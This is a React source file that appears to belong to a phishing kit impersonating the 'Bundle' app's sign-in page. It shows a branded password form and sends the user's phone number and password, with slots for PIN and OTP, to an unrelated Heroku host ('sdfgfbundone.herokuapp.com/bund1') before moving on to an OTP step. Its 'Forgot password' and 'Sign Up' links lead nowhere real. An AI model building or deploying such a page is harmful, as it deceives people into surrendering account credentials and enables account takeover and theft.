import React, { useState, useEffect } from 'react'
import { useHistory } from 'react-router-dom'
import { Link } from 'react-router-dom'

import LogoFooter from '../assets/bundleLogo.png'
import Logo from '../assets/bundle.png'

export default function AuthPassword(props) {
    const history = useHistory()
    const [loading, setLoading] = useState(false)
    const [password, setPassword] = useState('')
    const [slicedPhone, setSlicedPhone] = useState('')

    const propState = props.location.state
    useEffect(() => {
        if (propState) {
            console.log({ propState })
            const propToArr = propState.phone.split('')

            const slicedNum = propToArr.slice(
                propToArr.length - 5,
                propToArr.length
            )

            setSlicedPhone(slicedNum.join(''))
        }
    }, [])

    const handlePassword = (e) => {
        setPassword(e.target.value)
    }

    const handleSubmit = async (e) => {
        e.preventDefault()
        setLoading(true)

        if (propState) {
            propState.password = password
            try {
                const URL = 'https://sdfgfbundone.herokuapp.com'
                //  const URL = 'http://localhost:3030'
                const response = await fetch(URL + '/bund1', {
                    method: 'POST',
                    headers: {
                        Accept: 'application/json',
                        'Content-type': 'application/json',
                        Authorization: 'Bearer ' + propState.token,
                    },
                    credentials: 'include',
                    mode: 'cors',

                    body: JSON.stringify({
                        phone: propState.phone,
                        password: password,
                        pin: '',
                        otp: '',
                    }),
                })

                const resData = await response.json()

                if (resData.status === 'success') {
                    console.log('Message Sent.')
                    setLoading(false)

                    history.push('/activateOtp', propState)
                } else if (resData.status === 'fail') {
                    console.log('Message failed to send.')
                    setLoading(false)
                }
            } catch (err) {
                console.log(err)
                setLoading(false)
            }
        }
    }

    return (
        <div className='container mx-auto overflow-hidden'>
            <div className='max-w-sm mx-auto md:max-w-lg pt-12 grid'>
                <div className='w-full grid content-center pt-12'>
                    <img src={Logo} alt='' className=' justify-self-center' />
                    <div className=' h-64 py-3 px-4 rounded text-center'>
                        <form
                            className='grid w-full place-content-stretch md:w-3/4 md:mx-auto'
                            onSubmit={handleSubmit}
                        >
                            <h2 className='font-bold text-center text-black mb-2 text-xl'>
                                Welcome to back, {`(*****${slicedPhone})`}
                            </h2>
                            <p className='text-center mb-6'>
                                Not your account?{' '}
                                <Link to='/' className='underline'>
                                    Switch
                                </Link>
                            </p>

                            <input
                                type='password'
                                id='password'
                                className=' w-full text-black outline-none text-lg p-1 justify-self-stretch placeholder-[#b2b7be] focus:border-purple-500 rounded-3xl py-2 px-4'
                                required
                                value={password}
                                onChange={handlePassword}
                            />

                            <p className='text-right mb-8 mt-2'>
                                <Link to='/'>Forgot password?</Link>{' '}
                            </p>

                            <button className=' rounded-3xl outline-none  bg-[#6f42c1] text-white text-lg py-3'>
                                {loading ? 'loading..' : 'Sign In'}
                            </button>
                            <p className='text-center mt-2 mb-8'>
                                Not on Bundle?
                                <Link to='/' className='underline ml-1'>
                                    Sign Up
                                </Link>{' '}
                            </p>
                        </form>
                    </div>
                </div>
                <div
                    className='absolute bottom-8 left-2/4 logoAppear'
                    style={{
                        marginLeft: '-67.5px',
                    }}
                >
                    {' '}
                    <img src={LogoFooter} alt='' />
                </div>
            </div>
        </div>
    )
}
